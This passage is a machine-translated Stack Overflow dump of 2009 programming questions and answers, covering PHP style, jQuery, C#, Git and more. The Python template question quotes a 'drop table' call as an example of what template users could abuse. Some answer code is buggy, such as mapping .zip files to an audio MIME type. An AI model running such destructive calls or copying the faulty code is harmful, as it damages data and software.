    $variable = executefunctiononvariable($variable);
else
    $variable = executedifferentfunctiononvariable($variable); 
```

或者

```
if ($variable == 'setvalue') {
    $variable = executefunctiononvariable($variable);
} else {
    $variable = executedifferentfunctiononvariable($variable);
} 
```

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2009-02-15T04:34:42.943

我个人将我的 if/else 格式化为最后一个：

```
if ($variable == 'setvalue') {
    $variable = executefunctiononvariable($variable);
} else {
    $variable = executedifferentfunctiononvariable($variable);
} 
```

在我看来，您的版本是 1 和 3 的混合体。

我还与完成所有这些工作的编码器一起工作，但从未听说过标准编码器。

php网站使用最后一个：[http ://ca2.php.net/manual/en/control-structures.elseif.php](http://ca2.php.net/manual/en/control-structures.elseif.php)

在某些情况下，当 if 语句总是很短时，我也会使用第二个示例。如果它有可能变得更长（每个超过 1 行），我会做 #1。我尽量避免 #2，因为以后很难添加 {}。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-02-15T04:34:52.647

我使用最后一个：

```
if ($variable == 'setvalue') {
    $variable = executefunctiononvariable($variable);
} else {
    $variable = executedifferentfunctiononvariable($variable);
} 
```

话虽这么说，你选择哪一个并不重要，只要确保你是***一致***的。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2009-02-15T04:55:47.293

正确的方法是遵循项目的编码标准。如果没有，请采用 PHP-FIG、Zend、Symfony 等中的一种。

这种形式似乎很受欢迎：

```
if (condition) {
    statements
} else {
    statements
} 
```

*对于变量赋值，只有*当语句可以清晰地放在一行时，我才会使用三元：

```
$variable = !empty($foo) ? $foo : 'default'; 
```

**更新**：我已经删除了关于多行三元语句的部分，因为我不再认为这是一种明智的做法。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-02-15T10:10:50.830

我个人比较喜欢：

```
if(something){
    doSomething();
}
elseif(somethingElse){
    doSomethingElse();
}
else{
    doAnotherThing();
} 
```

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2009-05-14T20:10:30.083

不要忘记

```
if (expression):
   // code goes here
elseif (another expression):
   // code goes here
else:
   // code goes here
endif; 
```

当我做一些标签汤时，我个人喜欢这种结构。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2009-02-15T04:34:07.593

最重要的是，从事项目工作的程序员几乎都遵循**相同**的编码准则。因此，开会并选择其中一个，然后坚持下去。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2009-02-15T05:15:19.960

我曾经一直这样做 (2)，但由于 Sun 的编码约定使用 (4)，所以在 Java 编程中被打败了。所以现在我已经习惯了（4）。我最近一直在做一些 C#，它似乎默认使用 (2)（叹气，我们又来了）。

在 PHP 中，我习惯了（4），但（2）也很好。我一点也不喜欢（1 ）**。**

并且（3）是危险的。就我个人而言，我认为语言的语法应该需要大括号，即使它只是一个语句。避免您陷入麻烦。我认为这就是 Perl 从记忆中做的方式。

我也**讨厌**人们这样做：

```
if (something) {
  // do something
}
else if (something else) {
} 
```

那个让我发疯。所以我只觉得（2）和（4）是可以接受的。我不在乎它是哪一个，只要它始终如一地完成，最好在语言的约定范围内。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2009-02-15T04:37:39.303

没有正确或错误的方式，这是一种意见。就个人而言，我最喜欢最后一个（[1TBS？？？](http://en.wikipedia.org/wiki/Indent_style#Variant:_1TBS)）。我从不使用没有大括号的那个，我认为它总体上是不好的风格。

唯一能真正为您回答这个问题的人是其他将要编写代码的人。每个人都同意编码标准是很重要的。您选择哪种标准并不重要，因为每个人都使用它。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2009-02-15T05:15:01.130

PEAR 编码标准是*PHP*编码标准。我建议您习惯它，因为您会在其他项目中找到它，例如 Zend、Doctrine、Symfony、Horde 等等。

[http://framework.zend.com/manual/en/coding-standard.coding-style.html#coding-standard.coding-style.control-statements.if-else-elseif](http://framework.zend.com/manual/en/coding-standard.coding-style.html#coding-standard.coding-style.control-statements.if-else-elseif)

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2009-02-15T04:32:40.890

简而言之，这不是*正确*的做法。只要它有效，任何你觉得最好的，你都可以使用。你应该选择一个然后坚持下去，它会让你的代码更容易识别。

唯一的问题是，如果您不包含“{”字符，则您只能使用一个表达式或函数。

此外，如果您只想定义变量，则可以使用以下代码：

```
$variable = (CONDITIONAL STATEMENT) ? "It was true" : "It was false"; 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2009-02-15T10:27:59.260

在我的公司，我们使用：

```
if ($variable == 'setvalue')
{
    $variable = executefunctiononvariable($variable);
}
else
{
    $variable = executedifferentfunctiononvariable($variable);
} 
```

只要有标准，我并不重要

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2009-08-05T21:38:55.450

真的对我来说......这并不重要。我相信您应该能够毫无问题地阅读任何一种方式。花括号是否在新行上真的很重要吗？右括号后是否有空格真的很重要吗？

只要代码以至少尝试使其可读的方式完成，我真的不在乎。

有正确的方法吗？好吧，如果有，那么为什么我们可以选择不同的方式呢？

# .net - 具有自动隐藏窗口按钮的控件的名称是什么，例如 Visual Studio 2005/2008 中使用的那个？（。网）

> ID：550323
> 
> 赞同：0
> 
> 时间：2009-02-15T04:31:58.693
> 
> 标签：.net, winforms

在 Visual Studio 中，当您单击自动隐藏图钉外观图标时，窗口将折叠成一个带，该带具有停靠区域的每个隐藏窗口的按钮。

我在其他应用程序中看到过这个，所以我假设它是一个我还没有找到或想出如何使用的控件。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-15T04:47:43.617

.NET Framework 不包含具有开箱即用行为的控件（我相信它被称为可停靠窗格控件）。但是，许多第三方提供的控件可以很好地模仿它：

[http://www.codejock.com/products/dockingpane/](http://www.codejock.com/products/dockingpane/)

[http://www.infragistics.com/dotnet/netadvantage/winforms/windockmanager.aspx](http://www.infragistics.com/dotnet/netadvantage/winforms/windockmanager.aspx)

# java - 如何使用默认关联程序打开文件

> ID：550329
> 
> 赞同：92
> 
> 时间：2009-02-15T04:36:57.463
> 
> 标签：java, desktop

如何使用 Java 中的默认关联程序打开文件？（例如电影文件）

* * *

## 回答 #1

> 赞同：152
> 
> 时间：2009-02-15T04:44:01.657

您可以使用[`Desktop.getDesktop().open(File file)`](http://java.sun.com/javase/6/docs/api/java/awt/Desktop.html#open(java.io.File)). 有关其他选项，请参见以下问题：“ [[Java] 如何为给定文件打开用户系统首选编辑器？](https://stackoverflow.com/questions/526037/java-how-to-open-user-system-preffered-editor-for-given-file) ”

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-22T14:05:16.447

[SwingHacks](http://oreilly.com/catalog/9780596009076/)为旧版本的 Java 提供了解决方案。

我认为他们使用 Runtime 对象在 Windows 上执行“启动”命令，并且在 mac 上也有类似的命令。

* * *

## 回答 #3

> 赞同：-9
> 
> 时间：2016-11-03T09:56:30.307

干得好：

```
File myFile = new File("your any type of file url");
FileOpen.openFile(mContext, myFile); 
```

在包中创建一个不同的类：

```
// code to open default application present in the handset

public class FileOpen {

    public static void openFile(Context context, File url) throws IOException {
        // Create URI
        File file=url;
        Uri uri = Uri.fromFile(file);

        Intent intent = new Intent(Intent.ACTION_VIEW);
        // Check what kind of file you are trying to open, by comparing the url with extensions.
        // When the if condition is matched, plugin sets the correct intent (mime) type, 
        // so Android knew what application to use to open the file
        if (url.toString().contains(".doc") || url.toString().contains(".docx")) {
            // Word document
            intent.setDataAndType(uri, "application/msword");
        } else if(url.toString().contains(".pdf")) {
            // PDF file
            intent.setDataAndType(uri, "application/pdf");
        } else if(url.toString().contains(".ppt") || url.toString().contains(".pptx")) {
            // Powerpoint file
            intent.setDataAndType(uri, "application/vnd.ms-powerpoint");
        } else if(url.toString().contains(".xls") || url.toString().contains(".xlsx")) {
            // Excel file
            intent.setDataAndType(uri, "application/vnd.ms-excel");
        } else if(url.toString().contains(".zip") || url.toString().contains(".rar")) {
            // WAV audio file
            intent.setDataAndType(uri, "application/x-wav");
        } else if(url.toString().contains(".rtf")) {
            // RTF file
            intent.setDataAndType(uri, "application/rtf");
        } else if(url.toString().contains(".wav") || url.toString().contains(".mp3")) {
            // WAV audio file
            intent.setDataAndType(uri, "audio/x-wav");
        } else if(url.toString().contains(".gif")) {
            // GIF file
            intent.setDataAndType(uri, "image/gif");
        } else if(url.toString().contains(".jpg") || url.toString().contains(".jpeg") || url.toString().contains(".png")) {
            // JPG file
            intent.setDataAndType(uri, "image/jpeg");
        } else if(url.toString().contains(".txt")) {
            // Text file
            intent.setDataAndType(uri, "text/plain");
        } else if(url.toString().contains(".3gp") || url.toString().contains(".mpg") || url.toString().contains(".mpeg") || url.toString().contains(".mpe") || url.toString().contains(".mp4") || url.toString().contains(".avi")) {
            // Video files
            intent.setDataAndType(uri, "video/*");
        } else {
            //if you want you can also define the intent type for any other file

            //additionally use else clause below, to manage other unknown extensions
            //in this case, Android will show all applications installed on the device
            //so you can choose which application to use
            intent.setDataAndType(uri, "*/*");
        }

        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
        context.startActivity(intent);
    }
} 
```

# linux - 如何将 Git 安装到没有 apt-get 的服务器上？

> ID：550335
> 
> 赞同：2
> 
> 时间：2009-02-15T04:43:44.047
> 
> 标签：linux, git

我的主机是Bluehost。我的服务器在 Linux 上。

我试图按照[教程](http://www.urbanpuddle.com/articles/2008/07/11/installing-git-on-a-server-ubuntu-or-debian)进行操作。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-02-15T04:47:49.560

如果机器没有 apt-get，那么它很可能不是 Debian 或 Ubuntu 机器，这意味着使用为 Debian 或 Ubuntu 设计的教程不太可能让你走得很远。

*将打包版本用于您正在*运行的任何 Linux 发行版，或者从源代码构建。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-02-15T04:59:25.257

您可以使用常用`./configure && make && sudo make install`命令从源代码轻松编译它。

请参阅[“如何安装 git”](https://stackoverflow.com/questions/315911/git-for-beginners-the-definitive-practical-guide/323764#323764)。特别是 Mac OS X 部分（也适用于 Linux）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-15T04:49:02.053

[从http://git.or.cz/](http://git.or.cz/)获取源代码

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-15T07:58:16.423

也许你有同样的问题，我不能有一个传出连接，但我可以有一个传入连接，这就是我不能使用 apt-get 的原因。我移动文件所做的只是使用 WinSCP 并将文件移动到那里，然后对它们做任何我想做的事情。

# python - 如何提供安全模板供用户使用 python 进行修改？

> ID：550337
> 
> 赞同：0
> 
> 时间：2009-02-15T04:44:31.843
> 
> 标签：python, web, templates

我正在构建一个多用户 Web 应用程序。每个用户都可以在我的应用程序下拥有自己的站点。我正在考虑如何允许用户在没有安全问题的情况下修改模板？我已经评估了一些 python 模板引擎。例如，genshi，它是一个非常棒的模板引擎，但是允许用户修改 genshi 模板可能是危险的。它有这样的语法：

```
<?python

?> 
```

这种语法允许你运行任何你想要 python 可以做的事情。我注意到它似乎可以通过传递一些参数来关闭。但仍有很多潜在的问题。例如，用户可以访问内置函数和传递变量的方法。例如，如果我将 ORM 对象传递给模板。它可能包含一些我不想让用户触摸它的方法和变量。可能是这样的：

```
site.metadata.connection.execute("drop table xxx") 
```

所以我的问题是如何允许用户在没有安全问题的情况下修改他们网站的模板？可以使用任何 python 模板引擎。

谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-02-15T06:56:10.297

Jinja2 是一个具有沙盒功能的 Django 模板系统。我从未尝试过使用沙盒，但我非常喜欢 Jinja2 作为 Django 模板的替代品。它仍然促进模板与业务逻辑的分离，但有更多的 Pythonic 调用约定、命名空间等。

[Jinja2 沙盒](http://jinja.pocoo.org/2/documentation/sandbox)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-15T05:18:01.577

看看[Django 模板引擎](http://docs.djangoproject.com/en/dev/topics/templates/#topics-templates)。它不支持任意 python 代码的执行，所有可访问的变量都必须显式地传递到模板中。这应该是构建用户可定制页面的良好基础。请注意，您仍然需要处理用户偶尔的语法错误。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-15T05:25:28.517

在铁轨中有一种叫做[液体](http://www.liquidmarkup.org/)的东西。你可以看看那个以获得一些想法。另一个想法：至少，您*可以*做的一件事是将您的对象转换为简单的字典 - 类似于 json 表示，然后传递给您的模板。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2009-02-15T04:49:51.097

简短的回答可能是“你不能”。

您可能做的最好的事情就是将单个用户困在虚拟机或沙箱中。

# .net - 适用于多个 .Net 站点的 VS 项目

> ID：550350
> 
> 赞同：1
> 
> 时间：2009-02-15T04:57:29.270
> 
> 标签：.net, asp.net, visual-studio

这是我正在使用的：

*   几个网站
*   它们之间共享的类/数据（单个站点上的注册系统，以及中央站点上的管理）
*   每晚运行的工作流应用程序。

我需要能够干净、轻松地在网站和工作流组件之间共享类。我知道这是教科书“DLL！”，但我想知道您推荐什么样的 Visual Studio (2008) 项目以使这一切以干净、合乎逻辑的方式发生。

你有什么建议？

编辑：我似乎记得某种项目类型（在 VS05 中？）允许我在同一个解决方案中包含多个站点和项目（所有相关的）。我疯了吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-15T05:44:16.520

除非我在您的问题中遗漏了某些内容，否则这很简单。

您将为每个网站创建一个网站项目，并为您的 dll 提供一个类库项目。

但是我认为您的意思是如何在所有站点之间轻松共享 DLL？在这种情况下，尝试为 DLL 编写一些构建后事件，以将其部署到所有适当的 BIN 文件夹

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-15T07:07:10.923

在网站之间共享代码的另一种方式是通过在本地运行的 web 服务，并且对外部人员关闭。这样，您可以共享功能，但只有一个逻辑更新点 - 但话说回来，这使得升级代码变得困难，因为您需要确保在更改代码时您的网站都不会中断，并且修复错误等

对于一个解决方案中的多个站点，可以。您可以在同一个解决方案中拥有数百万个网站项目。有两个网站选项：网站和 Web 应用程序。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-15T07:13:57.180

首先创建一个平淡的解决方案。

然后根据需要将站点 1、2、3.... 添加到解决方案中。

将工作流项目添加到解决方案

将类库项目添加到解决方案。

在所有其他项目中引用类库项目。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-04-11T17:36:41.800

这是我遇到的问题。在 Visual Studio 2008 中，解决方案视图默认是隐藏的，因此很难添加其他项目、网站等。

[启用解决方案视图](http://blogs.msdn.com/sayanghosh/archive/2008/02/09/visual-studio-2008-does-not-show-solution-view-when-there-is-only-one-project-in-the-solution-by-default.aspx)解决了我所有的问题。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-02-15T17:06:47.353

我们这里的术语似乎有些模棱两可。我们假设当 jcelgin 提出问题时，他指的是网站（或网站）模板。如果是这样的话，那么他将在共享图书馆时遇到困难。这些站点实际上是否基于 Web 应用程序项目模板？如果是这样，那么它应该是直截了当的......

# php - jQuery：“成功”返回的表单需要重新绑定

> ID：550370
> 
> 赞同：4
> 
> 时间：2009-02-15T05:27:02.240
> 
> 标签：php, jquery, json, jquery-plugins

一个快速的问题。我正在使用 jQuery.forms.js 插件。

我有一个发布到 php 页面并使用 json 返回数据的表单。

返回的数据是新表单的代码（它替换了用于发布信息的表单）。新表单没有绑定到任何 jQuery 函数，因为它在页面加载时并不存在。

那么，如何让 ajax 表单识别新表单，这样如果我需要第二次使用该表单，它也使用 jQuery 函数？

```
// jQuery for submitting info to php doc and, on success, replacing the form 
$(document).ready(function() { 
    jQuery('form[id*=postOnline]').ajaxForm({ 
        dataType: 'json',
        success: function(data) { 
            $('#onlineStatus' + data.rid).html(data.formed).slideDown('slow');
            bindNote(); 
         } 
    });
});

<!-- /////////////////////// POST ONLINE /////////////////////// -->

<div id='onlineStatus<?php echo $b_id ?>' class='postOnline'>
  <form name="postOnline"  id="postOnline<?php echo $b_id ?>" action="postOnline.php" method="post">
    <input type="hidden" value="<?php echo $b_id ?>" name="b" />
    <input type="hidden" value="1" name="p" />
    <input type="submit" class="button"  value="Post Online" />
  </form>           
</div>

<!-- /////////////////////// POST ONLINE /////////////////////// -->

// ... code for entering data into database and then...
$result = mysql_query( $sql );
if($result) {
if($show == '1'){$val = 'remove from online'; $num='0';}
if($show == '0'){$val = 'show online'; $num='1';}

$return = "
<form name='postOnline'  id='postOnline$id' action='postOnline.php' method='post'>
<input type='hidden' value='$b_id' name='b' />
<input type='hidden' value='$num' name='p' />
<input type='submit' class='button'  value='$val' />
</form> 
";
    print json_encode(array("rid" => $id, "formed" => $return));
}
?> 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-02-15T06:14:00.070

最简单的解决方案是不使用 jQuery 的表单插件并手动执行，这真的不是很困难：

```
$(document).ready(function() { 
    jQuery('form[id*=postOnline]').live('submit', function() {
        var formdata = $(this).serialize();
        $.ajax({
            type: $(this).attr('method'),
            url: $(this).attr('action'),
            dataType: 'json',
            data: formdata,
            success: function(data) { 
                $('#onlineStatus' + data.rid).html(data.formed).slideDown('slow');
                bindNote(); 
            }
        });
        return false;
    });
}); 
```

现在，由于您使用的是 jQuery 的新 (1.3)[`live`](http://docs.jquery.com/Events/live)功能，因此您添加的与选择器匹配的任何表单`form[id*=postOnline]`仍将与此事件相关联。

或者，您可以打开 jquery 表单代码并找到它的绑定位置并尝试修改它以便它使用它`live`。甚至另一种选择是将连接包含在函数中，并在成功函数的末尾调用它，如下所示：

```
function bindForm() {
    jQuery('form[id*=postOnline]').ajaxForm({ 
        dataType: 'json',
        success: function(data) { 
            $('#onlineStatus' + data.rid).html(data.formed).slideDown('slow');
            bindNote();
            bindForm();
        } 
    });
}

$(document).ready(function() { 
    bindForm();
}); 
```

我不认为它很整洁，但它应该可以工作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-15T05:38:37.317

您需要在 ajax 调用之后重新绑定事件处理程序。我听说 jquery 的新版本中有一个新功能，称为[live events](http://docs.jquery.com/Events/live)，但这会使这变得不必要。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-18T05:47:48.923

如果由于某种原因你被 jQuery 1.3 之前的版本卡住了，请使用“ [livequery](http://docs.jquery.com/Plugins/livequery) ”插件。

# c# - 用 C# 绘图

> ID：550371
> 
> 赞同：63
> 
> 时间：2009-02-15T05:28:18.150
> 
> 标签：c#, plot, scientific-computing

C# 似乎在科学计算方面显示出一些希望，但我发现很少有人能绘制 2D 图，这对理科学生和科学家来说都非常重要。

是否有可靠、免费的方法来使用 C# 创建具有出版质量的 2D 绘图？并且能够保存为多种格式（png、eps、...）。类似于 Python 的 matplotlib 的东西？

* * *

## 回答 #1

> 赞同：58
> 
> 时间：2012-11-29T16:42:49.573

我推荐使用[OxyPlot](https://github.com/oxyplot/oxyplot)。它包含 WPF、Metro、Silverlight、Windows Forms、Avalonia UI、XWT 的软件包。除了图形，它还可以导出为 SVG、PDF、Open XML 等。它甚至支持 Android 和 iOS 的 Mono 和 Xamarin。它也在积极开发中。

还有一个新的（至少对我而言）开源 .NET 绘图库，名为[Live-Charts](https://github.com/beto-rodriguez/Live-Charts)。情节非常互动。库支持 WPF、WinForms 和 UWP。Xamarin 已计划。该设计是针对 MV* 模式进行的。但是@Paweł Audionysos 认为 Live-Charts WPF 的性能并不好。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2009-02-15T05:56:43.950

[ZedGraph](http://sourceforge.net/projects/zedgraph/)是一个不错的选择。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2009-02-15T06:06:40.307

请参阅[Microsoft 图表控件的示例环境](http://code.msdn.microsoft.com/mschart)：

> Microsoft Chart Controls for .NET Framework 的示例环境包含 200 多个针对**ASP.NET 和 Windows 窗体**的示例。这些示例涵盖了 .NET Framework 的图表控件中的所有主要功能。它们使您能够查看正在运行的图表控件，并将代码用作您自己的 Web 和 Windows 应用程序的模板。

似乎更面向商业，但可能对*理科学生和科学家*有一些价值。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2010-08-29T00:25:00.767

[gnuplot](http://www.gnuplot.info/)是一个在科学界广泛使用的积极维护的程序。通常绘图是从可以在 C# 程序中写出的数据文件生成的，但也可以从 C# 调用 gnuplot 可执行文件并将生成的图像显示在 C# 图片框中。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-02-15T05:46:58.403

几天前我开始使用新的 ASP.NET 图表控件，它的功能绝对令人惊叹。

[链接在这里。](http://www.microsoft.com/downloads/details.aspx?FamilyID=130f7986-bf49-4fe5-9ca8-910ae6ea442c&DisplayLang=en)

编辑：这显然仅在您使用 ASP.NET 时才适用。不确定 WinForms。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2015-05-08T12:47:10.930

我只是想补充 MajesticRa 对[OxyPlot](https://github.com/oxyplot)的推荐，并指出 OxyPlot 如何用于各种绘图案例。该软件是免费和开源的，非常精致，并允许在普通 2D 映射之外进行多种用途。

我一直在将 OxyPlot 用于一个非正统的项目，我在其中显示（在 WPF/C# 中）一个地图（机器人占用网格），我可以用 LineSeries（路径经过）和 PointSeries（路点）覆盖它。使用 OxyPlot ImageAnnotation 功能，我可以在我的 OxyPlot 中显示 60Hz 视频，方法是定期更新其自己的线程上的 ImageAnnotation，同时将一系列点映射到视频之上。背景视频和点甚至是可扩展和可翻译的。

希望这对其他希望在图像和视频之上显示图的人有所帮助。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-02-15T05:52:06.783

NPlot 是一个相当不错的简单开源 2D 绘图 API。不幸的是，该网站已关闭。我不知道这是否只是暂时的。我没有听说任何坏消息。它可能会卷土重来。

[http://www.nplot.com](http://www.nplot.com)

这是一篇描述它的文章：

[http://aspnet.4guysfromrolla.com/articles/072507-1.aspx](http://aspnet.4guysfromrolla.com/articles/072507-1.aspx)

上一篇文章使用的是 VB.NET，但显然这适用于 C#。

同样，不确定为什么 nplot 的站点当前无法正常工作，但它是我过去使用过的一种流行的绘图 API。我将其发布以供您参考，如果发生可能的事件，nplot 将很快备份。:)

编辑：

感谢 Hosam Aly，看起来 SourceForge 项目仍然可以在这里访问：

[http://sourceforge.net/projects/nplot](http://sourceforge.net/projects/nplot)

# c# - 在 ToString() 之前检查 null

> ID：550374
> 
> 赞同：77
> 
> 时间：2009-02-15T05:34:35.827
> 
> 标签：c#, .net, string, properties

这是场景...

```
if (entry.Properties["something"].Value != null)
  attribs.something = entry.Properties["something"].Value.ToString(); 
```

虽然有效且工作正常，但对我来说这看起来很难看。如果我在执行 ToString() 之前不检查 null，那么如果属性为 null，它会引发异常。有没有更好的方法来处理这种情况？

非常感激！

* * *

## 回答 #1

> 赞同：129
> 
> 时间：2009-02-15T05:39:45.753

8 年后更新（哇！）以涵盖[c# 6 的空条件运算符](https://msdn.microsoft.com/en-us/library/dn986595.aspx)：

```
var value = maybeNull?.ToString() ?? String.Empty; 
```

其他方法：

```
object defaultValue = "default";
attribs.something = (entry.Properties["something"].Value ?? defaultValue).ToString() 
```

我也用过这个，虽然不是很聪明但很方便：

```
public static string ToSafeString(this object obj)
{
    return (obj ?? string.Empty).ToString();
} 
```

* * *

## 回答 #2

> 赞同：42
> 
> 时间：2009-02-15T06:06:39.557

如果您的目标是 .NET Framework 3.5，我认为最优雅的解决方案是扩展方法。

```
public static class ObjectExtensions
{
    public static string NullSafeToString(this object obj)
    {
        return obj != null ? obj.ToString() : String.Empty;
    }
} 
```

然后使用：

```
attribs.something = entry.Properties["something"].Value.NullSafeToString(); 
```

* * *

## 回答 #3

> 赞同：39
> 
> 时间：2011-01-24T22:45:10.207

```
Convert.ToString(entry.Properties["something"].Value); 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-09-12T10:27:45.740

向对象添加空字符串是一种常见的习惯用法，可让您进行 null 安全`ToString`转换，如下所示：

```
attribs.something = ""+entry.Properties["something"].Value; 
```

`entry.Properties["something"].Value`什么时候`null`，这才悄然归来一片空虚`string`。

**编辑：**从 C# 6 开始，您可以使用`?.`运算符来避免`null`以更简单的方式进行检查：

```
attribs.something = entry.Properties["something"].Value?.ToString();
//                                                     ^^ 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-04-26T17:06:34.493

你不能这样做：

```
attribs.something = entry.Properties["something"].Value as string; 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2011-03-04T19:00:17.753

```
attribs.something = String.Format("{0}", entry.Properties["something"].Value); 
```

虽然不确定性能...

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2016-02-09T15:23:59.957

在 C# 6.0 中，你可以用一种非常优雅的方式来做到这一点：

`attribs.something = entry.Properties["something"].Value?.ToString();`

这是一篇关于新的[空条件运算符](https://msdn.microsoft.com/en-us/library/dn986595.aspx)的文章。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-02-15T05:47:09.667

作为 RexM 答案的变体：

```
attribs.something = (entry.Properties["something"].Value ?? attribs.something).ToString() 
```

唯一的缺点是即使 entry.Properties["something"].Value 为 null，attribs.something 也会被分配一个值（在本例中是它本身）——如果 .something 属性进行一些其他处理，这可能会很昂贵和/或这条线执行了很多（比如在循环中）。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2009-02-15T05:48:33.437

为了准确地做你想做的事，总是可以使用辅助方法：

```
CopyIfNotNull(entry.Properties["something"].Value, out attribs.something);

void CopyIfNotNull(string src, out string dest)
{
  if(src != null)
    dest = src;
} 
```

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2010-10-07T09:41:49.823

```
attribs.something  = string.Format("{0}",entry.Properties["something"].Value) 
```

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2011-03-04T15:25:46.263

是否有可能做类似 [Dale Ragan 上面的回答](https://stackoverflow.com/questions/550374/checking-for-null-before-tostring/550399#550399)，但覆盖 ToString() 而不是创建新的 NullSafeToString() 方法？我希望这（或返回“null”）成为默认行为。当我将以下方法添加到公共静态类 ObjectExtensions 时，编译器（Visual C# 2010 Express）没有抱怨，但没有调用该方法......

```
public static String ToString(this Object obj)
{
    if (obj == null)
    {
        return "null";
    }
    else
    {
        return obj.GetType().Name;
    }
} 
```

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2009-02-15T05:47:25.297

如何使用这样的辅助方法：

```
attribs.something = getString(
    entry.Properties["something"].Value, 
    attribs.something);

static String getString(
    Object obj,
    String defaultString)
{
    if (obj == null) return defaultString;
    return obj.ToString();
} 
```

或者，您可以使用`??`运算符：

```
attribs.something = 
    (entry.Properties["something"].Value ?? attribs.something).ToString(); 
```

`ToString()`（注意值为 时的冗余调用`null`）

# css - IE8实现“border-radius”的概率真的为零吗？

> ID：550393
> 
> 赞同：0
> 
> 时间：2009-02-15T05:53:14.410
> 
> 标签：css, rounded-corners

[说真的，实施起来](http://www.the-art-of-web.com/css/border-radius/)有多难？

我真的不想让[50% 的用户](http://analytics.google.com)没有圆角吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-15T06:09:32.093

好吧，除非 JS 不是一个选项，否则您始终可以使用 jQuery 或任何其他效果库来弯曲元素的角。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2009-02-15T07:16:13.367

我不会担心的。很快，使用 IE 的人数将少于 10%。

# javascript - 如何使 HTML 文档在浏览器中可写？

> ID：550401
> 
> 赞同：2
> 
> 时间：2009-02-15T06:06:53.160
> 
> 标签：javascript, internet-explorer, firefox, edit-in-place

免得我的问题不清楚；我并不是说`<p>`用`<textarea>`. 我的意思是直接编辑所有文本——包括标题、文本`<div>`和`<span>`是编辑表。我知道这在 IE 中是可能的，并且我有一个脚本可以在可编辑和返回之间切换，它在 IE 中有效，但在 Firefox 中不起作用。有没有办法让它在FF中工作？

PS 我从[Danny Goodman 的 JavaScript Bible Gold Edition 获得的 IE 脚本，2001](http://books.google.com/books?id=9e2jQgAACAAJ&dq=JavaScript%20Bible%20Gold%20Edition%20by%20Danny%20Goodman,&source=gbs_book_other_versions)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-02-15T06:12:37.140

[Firefox 的Firebug 扩展](http://getfirebug.com/)几乎允许您编辑任何内容。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-15T11:17:42.917

在 firefox > 3 中，您可以将*contentEditable*用于我理解的 html 元素。标签如下所示：

```
<div id="myEditableDiv" contentEditable="true">click here to edit ...</div> 
```

您可以使用“execCommand”控制编辑过程（请参阅：[msdn](http://msdn.microsoft.com/en-us/library/ms533049(VS.85).aspx)以获取命令标识符）

# objective-c - 将 NSData 字节转换为 NSString？

> ID：550405
> 
> 赞同：50
> 
> 时间：2009-02-15T06:10:32.637
> 
> 标签：objective-c, cocoa, bittorrent

我正在尝试使用[BEncoding ObjC 类](http://www.stupendous.net/projects/bencoding-obj-c-class/)来解码`.torrent`文件。

```
NSData *rawdata = [NSData dataWithContentsOfFile:@"/path/to/the.torrent"];
NSData *torrent = [BEncoding objectFromEncodedData:rawdata]; 
```

当我`NSLog` `torrent`得到以下信息时：

```
{
    announce = <68747470 3a2f2f74 6f727265 6e742e75 62756e74 752e636f 6d3a3639 36392f61 6e6e6f75 6e6365>;
    comment = <5562756e 74752043 44207265 6c656173 65732e75 62756e74 752e636f 6d>;
    "creation date" = 1225365524;
    info =     {
        length = 732766208;
        name = <7562756e 74752d38 2e31302d 6465736b 746f702d 69333836 2e69736f>;
        "piece length" = 524288;
.... 
```

如何将其`name`转换为 NSString？我试过了..

```
NSData *info = [torrent valueForKey:@"info"];
NSData *name = [info valueForKey:@"name"];
unsigned char aBuffer[[name length]];
[name getBytes:aBuffer length:[name length]];
NSLog(@"File name: %s", aBuffer); 
```

..它检索数据，但之后似乎有额外的 unicode 垃圾：

```
File name: ubuntu-8.10-desktop-i386.iso) 
```

